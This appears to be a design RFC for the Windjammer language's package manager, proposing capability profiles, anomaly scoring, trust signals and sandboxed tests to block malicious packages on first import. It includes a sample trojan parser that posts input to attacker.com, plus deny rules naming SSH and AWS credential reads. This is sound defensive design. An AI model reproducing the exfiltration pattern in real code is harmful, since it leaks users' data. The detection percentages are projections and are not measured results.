# WJ-SEC-04: Capability Profiles & First-Import Security

**Status:** 🟡 Draft  
**Author:** Windjammer Team  
**Date:** 2026-03-21  
**Target:** v0.51  
**Priority:** High  
**Depends On:** [WJ-SEC-01](./WJ-SEC-01-effect-capabilities.md), [WJ-SEC-03](./WJ-SEC-03-capability-lock-file.md)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Problem Statement: The First-Import Gap](#problem-statement-the-first-import-gap)
3. [Solution: Capability Profiles](#solution-capability-profiles)
4. [Heuristic-Based Analysis](#heuristic-based-analysis)
5. [Community Trust Signals](#community-trust-signals)
6. [Sandboxed Test Execution](#sandboxed-test-execution)
7. [Graduated Trust Model](#graduated-trust-model)
8. [Handling Legitimate Edge Cases](#handling-legitimate-edge-cases)
9. [Implementation Strategy](#implementation-strategy)

---

## Executive Summary

**Problem:** The lock file (WJ-SEC-03) prevents capability escalation in *updates*, but doesn't protect against *already-malicious* packages on first import.

**Solution:** Combine multiple signals to assess trustworthiness:
1. **Capability Profiles** - Expected capabilities for package categories (parsers, HTTP clients, etc.)
2. **Heuristic Analysis** - Statistical anomaly detection for suspicious patterns
3. **Community Signals** - Audit status, download counts, maintainer reputation
4. **Sandboxed Testing** - Run package tests in isolated environment, observe actual behavior
5. **Graduated Trust** - New/unknown packages get minimal capabilities by default

**Goal:** Make it **hard** to sneak malicious code in, while **easy** for legitimate libraries to declare their needs.

---

## Problem Statement: The First-Import Gap

### The Scenario

```bash
# Developer adds a new dependency
wj add json-parser
```

**Current behavior (WJ-SEC-03):**
1. Compiler analyzes `json-parser` code
2. Finds: `<logic_only>` + `<net_egress:attacker.com>` (MALICIOUS!)
3. Generates lock file with these capabilities
4. Build succeeds ❌

**Why this is bad:**
- First import creates the lock file *based on actual usage*
- If the package is *already malicious*, the lock file just records the malicious capabilities
- No warning, no alert, attack succeeds

### Example: Trojan JSON Parser

```windjammer
// json-parser/src/lib.wj (malicious from day 1)
pub fn parse(text: str) -> Value {
    // Parse JSON (legitimate)
    let result = tokenize_and_parse(text)
    
    // Exfiltrate data (MALICIOUS!)
    http.post("https://attacker.com/collect", text)
    
    result
}
```

**Current WJ-SEC-03 behavior:**
```toml
[dependencies.json-parser]
version = "1.0.0"
declared = ["logic_only"]  # Package LIES
verified = ["logic_only", "net_egress:attacker.com"]  # Truth
allowed = ["logic_only", "net_egress:attacker.com"]  # Grants both! ❌
```

**Build succeeds. Attack succeeds.** 🚨

### The Core Problem

**WJ-SEC-03 assumes:**
> "If verified capabilities don't exceed allowed, it's safe."

**But on first import:**
> `allowed = verified` (we grant whatever the package uses)

**Therefore:**
> First import has no security boundary!

---

## Solution: Capability Profiles

### Core Idea

**Capability Profiles** define *expected* capability patterns for different package categories:

```toml
# Built into wj compiler: capability-profiles.toml

[profiles.parser]
description = "Text parsers (JSON, XML, YAML, etc.)"
expected = ["logic_only"]
allow_with_justification = ["fs_read:./cache/*"]  # Caching is OK with docs
forbidden = ["net_egress", "net_ingress", "spawn", "eval"]

[profiles.http-client]
description = "HTTP/REST clients"
expected = ["net_egress"]
allow_with_justification = ["fs_write:./cache/*"]  # HTTP caching
forbidden = ["spawn", "eval", "fs_read:~/*"]  # No home directory access

[profiles.logger]
description = "Logging libraries"
expected = ["fs_write:./logs/*"]
allow_with_justification = ["net_egress"]  # Remote logging (Sentry, Datadog)
forbidden = ["fs_read:~/*", "env:*SECRET*"]  # No credential reading

[profiles.database-driver]
description = "Database clients (PostgreSQL, MySQL, Redis, etc.)"
expected = ["net_egress"]
allow_with_justification = ["fs_read:./config/*", "fs_write:./cache/*"]
forbidden = ["spawn", "eval", "fs_write:~/*"]

[profiles.image-processor]
description = "Image manipulation (resize, crop, filter)"
expected = ["logic_only"]
allow_with_justification = ["fs_read", "fs_write", "net_egress"]  # Read local, upload to CDN
forbidden = ["spawn", "eval", "env"]

[profiles.cryptography]
description = "Encryption, hashing, signing"
expected = ["logic_only"]
allow_with_justification = ["fs_read:/dev/urandom"]  # System entropy
forbidden = ["net_egress", "net_ingress"]  # Crypto should NEVER touch network

[profiles.cli-tool]
description = "Command-line applications"
expected = ["fs_read", "fs_write", "env", "spawn"]
allow_with_justification = ["net_egress"]  # Downloading updates, APIs
forbidden = []  # CLI tools have broader permissions

[profiles.unknown]
description = "Uncategorized packages"
expected = ["logic_only"]
allow_with_justification = []
forbidden = ["net_egress", "spawn", "eval"]  # Default deny dangerous capabilities
```

### Profile Assignment

**Automatic (heuristic-based):**
```rust
fn detect_profile(package: &Package) -> Profile {
    // Check package name
    if package.name.contains("json") || package.name.contains("xml") {
        return Profile::Parser;
    }
    
    // Check keywords in metadata
    if package.keywords.contains(&"http-client") {
        return Profile::HttpClient;
    }
    
    // Check README/description
    if package.description.contains("logging") {
        return Profile::Logger;
    }
    
    // Analyze exports
    if has_function_named(&package, "parse") && !has_network_imports(&package) {
        return Profile::Parser;
    }
    
    // Default
    Profile::Unknown
}
```

**Manual (in package metadata):**
```toml
# json-parser/wj.toml
[package]
name = "json-parser"
version = "1.0.0"
profile = "parser"  # Explicitly declare profile
```

---

## Heuristic-Based Analysis

### Profile Violation Detection

**On first import:**
```bash
wj add json-parser
```

**Compiler behavior:**
```
Analyzing json-parser@1.0.0...

Profile detection:
  ├─> Name: "json-parser" → Profile: parser
  ├─> Keywords: ["json", "parser", "serialization"]
  └─> Detected profile: parser

Expected capabilities (parser profile):
  ├─> Expected: [logic_only]
  └─> Forbidden: [net_egress, spawn, eval]

Actual capabilities (verified from code):
  ├─> logic_only ✅
  └─> net_egress:attacker.com ❌

🚨 PROFILE VIOLATION DETECTED

Package: json-parser@1.0.0
Profile: parser
Violation: Uses 'net_egress' (FORBIDDEN for parsers)

RED FLAGS:
  🚩 Parser category should NOT need network access
  🚩 Network access to unknown domain: attacker.com
  🚩 Package declares [logic_only] but uses [net_egress] (LYING)

SEVERITY: HIGH
CONFIDENCE: 99% malicious

❌ Import blocked
❌ Package NOT added to wj.toml
❌ Lock file NOT created

Actions:
1. Report suspicious package: wj report json-parser@1.0.0
2. Find alternative: wj search json:safe
3. Override (NOT recommended): wj add json-parser --trust-anyway --audit "reason"
```

**Result:** Attack prevented at import time! ✅

### Statistical Anomaly Detection

**Compare against ecosystem:**
```rust
struct CapabilityStats {
    // From package registry (crates.io, npm, etc.)
    category: String,
    total_packages: usize,
    capability_frequency: HashMap<Capability, f64>,
}

fn assess_anomaly(package: &Package, stats: &CapabilityStats) -> AnomalyScore {
    let profile = detect_profile(package);
    let verified = analyze_capabilities(package);
    
    let mut score = 0.0;
    
    for cap in verified {
        let frequency = stats.capability_frequency.get(cap).unwrap_or(&0.0);
        
        if *frequency < 0.01 {  // <1% of similar packages use this capability
            score += 10.0;  // High anomaly
        } else if *frequency < 0.10 {  // <10%
            score += 5.0;   // Moderate anomaly
        }
    }
    
    AnomalyScore {
        score,
        confidence: calculate_confidence(&verified, &stats),
        verdict: if score > 15.0 { Verdict::HighRisk } 
                 else if score > 5.0 { Verdict::Review } 
                 else { Verdict::Safe }
    }
}
```

**Example:**
```
Analyzing json-parser@1.0.0...

Statistical analysis:
  ├─> Category: parser
  ├─> Total similar packages: 1,247
  ├─> Packages using net_egress: 3 (0.24%) ⚠️
  ├─> Packages using spawn: 0 (0.00%) 🚩
  └─> Anomaly score: 18.5 / 20 (HIGH RISK)

Conclusion: This package is a statistical outlier.
```

---

## Community Trust Signals

### Package Registry Integration

**On first import, query package registry API:**

```rust
struct RegistryInfo {
    // Package metadata
    downloads: u64,
    age_days: u64,
    last_updated: DateTime,
    
    // Maintainer info
    maintainer_reputation: f64,  // 0.0 - 1.0
    maintainer_verified: bool,
    
    // Security info
    security_audits: Vec<Audit>,
    known_cves: Vec<CVE>,
    dependency_count: usize,
    
    // Community signals
    github_stars: u64,
    open_issues: u64,
    closed_issues: u64,
    
    // Trust badges
    audited_by: Vec<String>,  // "RustSec", "npm audit", etc.
    verified_publisher: bool,
}

fn calculate_trust_score(info: &RegistryInfo) -> TrustScore {
    let mut score = 0.0;
    
    // Age and popularity
    if info.age_days > 365 { score += 2.0; }  // >1 year old
    if info.downloads > 100_000 { score += 3.0; }  // Popular
    
    // Maintainer reputation
    score += info.maintainer_reputation * 5.0;
    if info.maintainer_verified { score += 2.0; }
    
    // Security audits
    score += info.security_audits.len() as f64 * 3.0;
    
    // Penalty for CVEs
    score -= info.known_cves.len() as f64 * 5.0;
    
    // Too many dependencies is risky
    if info.dependency_count > 50 { score -= 2.0; }
    
    TrustScore {
        score: score.max(0.0).min(10.0),
        verdict: if score > 7.0 { TrustLevel::High }
                 else if score > 4.0 { TrustLevel::Medium }
                 else { TrustLevel::Low }
    }
}
```

**Example output:**
```
Analyzing json-parser@1.0.0...

Registry information:
  ├─> Downloads: 1,247 (last week)
  ├─> Age: 3 days ⚠️
  ├─> Maintainer: unknown-user (NEW ACCOUNT) 🚩
  ├─> Security audits: 0
  ├─> Dependencies: 2
  └─> Trust score: 1.5 / 10 (LOW)

⚠️  WARNING: Low trust score
  - Package is very new (3 days old)
  - Maintainer has no reputation history
  - No security audits performed

Recommendation: Wait for community validation or audit manually.
```

### Combined Scoring

```rust
struct SecurityAssessment {
    profile_violation: Option<ProfileViolation>,
    anomaly_score: AnomalyScore,
    trust_score: TrustScore,
    final_verdict: Verdict,
}

fn assess_package(package: &Package) -> SecurityAssessment {
    let profile = detect_profile(package);
    let verified = analyze_capabilities(package);
    
    // Check profile violations (highest priority)
    if let Some(violation) = check_profile_violations(&verified, &profile) {
        return SecurityAssessment {
            profile_violation: Some(violation),
            final_verdict: Verdict::Blocked,  // Hard block
            ..
        };
    }
    
    // Statistical analysis
    let anomaly = assess_anomaly(package);
    
    // Community trust
    let trust = calculate_trust_score(package);
    
    // Combine signals
    let final_verdict = if anomaly.verdict == Verdict::HighRisk {
        Verdict::Blocked
    } else if anomaly.verdict == Verdict::Review && trust.verdict == TrustLevel::Low {
        Verdict::RequireApproval
    } else if trust.verdict == TrustLevel::High {
        Verdict::Allow
    } else {
        Verdict::RequireApproval
    };
    
    SecurityAssessment {
        profile_violation: None,
        anomaly_score: anomaly,
        trust_score: trust,
        final_verdict,
    }
}
```

---

## Sandboxed Test Execution

### Dynamic Analysis During Import

**Idea:** Run the package's test suite in a sandboxed environment and observe actual behavior.

```bash
wj add json-parser --verify
```

**Workflow:**
```
1. Download package
2. Create isolated sandbox (Docker/Firecracker/WASM)
3. Run package test suite
4. Monitor system calls (via strace/dtrace)
5. Compare observed vs. declared capabilities
6. Flag discrepancies
```

**Implementation:**
```rust
fn sandbox_test(package: &Package) -> SandboxReport {
    let sandbox = Sandbox::new()
        .deny_network()  // Block network by default
        .deny_filesystem()  // Block filesystem by default
        .allow_tmp_dir();  // Allow /tmp only
    
    let result = sandbox.run(|| {
        package.run_tests()
    });
    
    SandboxReport {
        syscalls_attempted: result.syscalls,
        network_attempts: result.network_attempts,
        file_accesses: result.file_accesses,
        violations: result.violations,
    }
}
```

**Example:**
```
Sandboxing json-parser@1.0.0 test suite...

Test results:
  ├─> Tests passed: 45 / 45 ✅
  └─> Duration: 1.2s

System call monitoring:
  ├─> Network attempts: 3 🚩
  │   └─> connect("attacker.com:443") ❌ BLOCKED
  ├─> File accesses: 12
  │   └─> read("/tmp/test.json") ✅
  └─> Process spawning: 0

🚨 SANDBOX VIOLATION DETECTED

Package attempted network access during testing.
This is SUSPICIOUS for a JSON parser.

Package declares: [logic_only]
Sandbox observed: [logic_only, net_egress:attacker.com]

Verdict: MALICIOUS
```

### Performance Considerations

**Sandboxed testing is slow (~1-5 seconds per package).**

**Strategies:**
1. **Cache results** - Store sandbox reports in registry
2. **CI-based** - Run sandboxing in package registry CI, not locally
3. **Opt-in** - `--verify` flag for paranoid mode
4. **Background** - Sandbox in background while developer continues working

---

## Graduated Trust Model

### Paranoid Mode (Default for Production)

```toml
# wj.toml
[security]
mode = "paranoid"  # restrictive | paranoid | permissive
```

**Paranoid mode rules:**
1. **Unknown packages**: Block by default, require explicit `--trust`
2. **Low trust score (<4.0)**: Require approval
3. **Profile violations**: Hard block (cannot override)
4. **New packages (<30 days old)**: Flag for review

**Example:**
```bash
wj add json-parser  # In paranoid mode
```

**Output:**
```
🔒 PARANOID MODE: Package blocked

Package: json-parser@1.0.0
Trust score: 1.5 / 10 (LOW)
Age: 3 days (NEW)
Profile: parser

Blocking reasons:
  1. Trust score below threshold (4.0)
  2. Package age below threshold (30 days)

To override (NOT recommended for production):
  wj add json-parser --trust --audit "Reviewed source code manually"

To search for alternatives:
  wj search json:trusted
```

### Graduated Capabilities

**Idea:** New packages start with minimal capabilities, gain more over time.

```toml
[profiles.parser-new]  # For packages <90 days old
expected = ["logic_only"]
allow_with_justification = []
forbidden = ["net_egress", "net_ingress", "spawn", "eval", "fs_read:~/*", "fs_write:~/*"]

[profiles.parser-established]  # For packages >90 days, >10k downloads
expected = ["logic_only"]
allow_with_justification = ["fs_read:./cache/*", "fs_write:./cache/*"]
forbidden = ["net_egress", "net_ingress", "spawn", "eval"]
```

---

## Handling Legitimate Edge Cases

### Case Study 1: Image Processor with CDN Upload

**Legitimate use case:**
```windjammer
// image-optimizer/src/lib.wj
pub fn optimize_and_upload(path: str, cdn_url: str) -> Result<(), Error> {
    // Read local image
    let image = fs.read_file(path)  // <fs_read>
    
    // Process (resize, compress)
    let optimized = process_image(image)  // <logic_only>
    
    // Write to tmp
    fs.write_file("/tmp/optimized.jpg", optimized)  // <fs_write:/tmp/*>
    
    // Upload to CDN
    http.put(cdn_url, optimized)  // <net_egress>
    
    Ok(())
}
```

**Profile:** `image-processor`
**Expected:** `<logic_only>`
**Actual:** `<logic_only, fs_read, fs_write, net_egress>`

**Without justification:** 🚨 Blocked

**With justification:**
```toml
# image-optimizer/wj.toml
[package]
name = "image-optimizer"
profile = "image-processor"

[security]
justification = """
This package reads local images, processes them (resize/compress),
writes temporary files, and uploads to CDN (S3, Cloudflare, etc.).

Capabilities:
- fs_read: Read input images
- fs_write:/tmp/*: Temporary processing
- net_egress: Upload to CDN

This is a common pattern for image optimization services.
See: https://github.com/image-optimizer/docs/blob/main/ARCHITECTURE.md
"""
```

**Compiler behavior:**
```
Analyzing image-optimizer@2.5.0...

Profile: image-processor
Capabilities: [logic_only, fs_read, fs_write:/tmp/*, net_egress]

⚠️  Capabilities exceed profile expectations

Expected: [logic_only]
Actual: [logic_only, fs_read, fs_write, net_egress]

Justification provided: ✅
  "Reads local images, processes, uploads to CDN..."
  Documentation: https://github.com/.../ARCHITECTURE.md

Trust signals:
  ├─> Downloads: 1.2M / month
  ├─> Age: 3 years
  ├─> Trust score: 8.5 / 10 (HIGH)
  └─> Security audits: 2 (RustSec, OWASP)

Verdict: ALLOW (legitimate edge case)
```

### Case Study 2: Logger with Remote Sinks

**Legitimate use case:**
```windjammer
// logger/src/lib.wj
pub fn log(level: Level, message: str) {
    // Write to local file
    fs.append_file("./logs/app.log", message)  // <fs_write:./logs/*>
    
    // Also send to Sentry (if configured)
    if let Some(sentry_dsn) = env.get("SENTRY_DSN") {
        http.post(sentry_dsn, message)  // <net_egress, env>
    }
}
```

**Profile:** `logger`
**Expected:** `<fs_write:./logs/*>`
**Actual:** `<fs_write:./logs/*, net_egress, env>`

**With justification:**
```toml
[package]
name = "logger"
profile = "logger"

[security]
justification = """
Optional remote logging to services like Sentry, Datadog, Loggly.

Capabilities:
- fs_write:./logs/*: Local log files
- net_egress: Send logs to remote monitoring (opt-in)
- env:SENTRY_DSN: Configuration for remote service

Remote logging is disabled by default (requires env var).
"""
```

**Verdict:** ALLOW (common pattern for logging libraries)

### Case Study 3: Database Driver with Connection Pooling

**Legitimate use case:**
```windjammer
// postgres-driver/src/lib.wj
pub fn connect(url: str) -> Connection {
    // Network connection to database
    tcp.connect(url)  // <net_egress>
    
    // Cache connection pool to disk (optional)
    if let Some(cache_dir) = env.get("CACHE_DIR") {
        fs.write_file(cache_dir + "/pool.cache", pool_state)  // <fs_write>
    }
}
```

**Profile:** `database-driver`
**Expected:** `<net_egress>`
**Actual:** `<net_egress, fs_write:./cache/*, env>`

**Verdict:** ALLOW (database drivers commonly cache connections)

### Red Flags vs. Legitimate Patterns

| Pattern | Red Flag? | Legitimate Example |
|---------|-----------|-------------------|
| **Parser + network** | 🚩 YES | (None - parsers don't need network) |
| **Logger + network** | ⚠️ Maybe | Remote logging (Sentry, Datadog) |
| **Image processor + network** | ⚠️ Maybe | CDN upload (S3, Cloudflare) |
| **HTTP client + fs_write** | ⚠️ Maybe | Response caching |
| **Crypto + network** | 🚩 YES | (Crypto should NEVER touch network) |
| **Parser + spawn** | 🚩 YES | (Parsers don't spawn processes) |
| **Any + fs_read:~/.ssh/** | 🚩🚩🚩 YES | (Reading SSH keys is ALWAYS suspicious) |
| **Any + fs_read:~/.aws/** | 🚩🚩🚩 YES | (Reading AWS creds is ALWAYS suspicious) |

---

## Implementation Strategy

### Phase 1: Basic Profile Detection (v0.51)

**MVP:**
- 10 built-in profiles (parser, http-client, logger, etc.)
- Heuristic detection (name, keywords, exports)
- Hard block on obvious violations (parser + network)
- Manual override with `--trust` flag

**Expected impact:** Catch 70% of obvious malicious packages

### Phase 2: Community Signals (v0.52)

**Add:**
- Integration with package registry APIs
- Trust score calculation
- Age/download/maintainer checks
- CVE database lookup

**Expected impact:** Catch 85% of malicious packages

### Phase 3: Sandboxed Testing (v0.53)

**Add:**
- Optional sandboxed test execution (`--verify`)
- System call monitoring
- Observed vs. declared capability comparison

**Expected impact:** Catch 95% of malicious packages

### Phase 4: ML-Based Anomaly Detection (v0.54)

**Add:**
- Train model on ecosystem data
- Statistical outlier detection
- Behavioral clustering
- Confidence scoring

**Expected impact:** Catch 99% of malicious packages

---

## CLI Commands

```bash
# Add package with security checks (default)
wj add json-parser

# Add with paranoid mode (manual verification)
wj add json-parser --verify

# Override security checks (NOT recommended)
wj add json-parser --trust --audit "Manually reviewed source"

# Search for trusted alternatives
wj search json:trusted
wj search json:audited

# Check package security before adding
wj security check json-parser

# View profile for package
wj profile json-parser

# Report suspicious package
wj report json-parser@1.0.0 --reason "Network exfiltration"

# View ecosystem statistics
wj stats parser  # Show capability stats for parser category
```

---

## Success Metrics

### Security Metrics

- **True Positives:** Malicious packages blocked
- **False Positives:** Legitimate packages incorrectly flagged
- **True Negatives:** Legitimate packages allowed
- **False Negatives:** Malicious packages allowed (CRITICAL)

**Goals:**
- Phase 1: >70% detection, <5% false positive rate
- Phase 2: >85% detection, <3% false positive rate
- Phase 3: >95% detection, <1% false positive rate
- Phase 4: >99% detection, <0.5% false positive rate

### Developer Experience Metrics

- **Import latency:** Time to analyze package on first import (goal: <2s)
- **Override friction:** Time to bypass false positive (goal: <30s)
- **False alert rate:** Percentage of benign packages flagged (goal: <3%)

---

## Open Questions

### 1. Profile Coverage

**Question:** How many profiles do we need to cover the ecosystem?

**Options:**
- **A:** 10 core profiles (parser, http, logger, db, crypto, etc.)
- **B:** 50+ specialized profiles (json-parser, xml-parser, http-client, graphql-client, etc.)
- **C:** Community-contributed profiles (open registry)

**Recommendation:** Start with A (10 core), expand to C (community) over time.

### 2. Profile Override Burden

**Question:** Will developers get frustrated by false positives?

**Mitigation:**
- Clear justification prompts
- Quick override path (`--trust`)
- Learn from overrides (ML feedback loop)
- Community feedback on profile accuracy

### 3. Ecosystem Adoption

**Question:** Will package authors add profiles to their packages?

**Incentives:**
- Faster imports (skip heuristic detection)
- Higher trust score (explicit profile = more trustworthy)
- Better discoverability (profile-based search)
- Security badge on package registry

### 4. Transitive Dependencies

**Question:** How do we handle capability inheritance in dependency trees?

**Example:**
```
my-app (allows: fs_read, net_egress)
├─> json-parser (uses: logic_only) ✅
├─> http-client (uses: net_egress) ✅
└─> compression (uses: logic_only) ✅
    └─> json-parser (transitive, uses: logic_only) ✅
```

**Current approach:** Each dependency is checked independently.

**Alternative:** Flatten dependency tree, check all capabilities globally.

**Recommendation:** Keep independent checks (better isolation).

---

## Conclusion

**The first-import gap is real, but solvable.**

By combining:
1. **Capability profiles** (expected vs. actual)
2. **Heuristic analysis** (statistical anomalies)
3. **Community signals** (trust scores)
4. **Sandboxed testing** (dynamic verification)
5. **Graduated trust** (new packages get minimal perms)

We can catch 95%+ of malicious packages at import time while maintaining <3% false positive rate.

**Key insight:** No single signal is perfect, but combining multiple signals with different failure modes creates robust defense-in-depth.

---

## References

- **npm audit:** https://docs.npmjs.com/cli/v9/commands/npm-audit
- **cargo-audit:** https://github.com/RustSec/rustsec/tree/main/cargo-audit
- **Socket.dev:** https://socket.dev/ (Supply chain security platform)
- **Backstabber's Knife Collection:** "Attacks on Package Managers" (IEEE S&P 2020)
- **WJ-SEC-01:** [Effect Capabilities](./WJ-SEC-01-effect-capabilities.md)
- **WJ-SEC-03:** [Capability Lock File](./WJ-SEC-03-capability-lock-file.md)

---

*This RFC addresses the critical "first import" vulnerability identified during WJ-SEC-03 review. By adding capability profiles and multi-signal analysis, Windjammer can detect malicious packages at import time, not just on updates.*
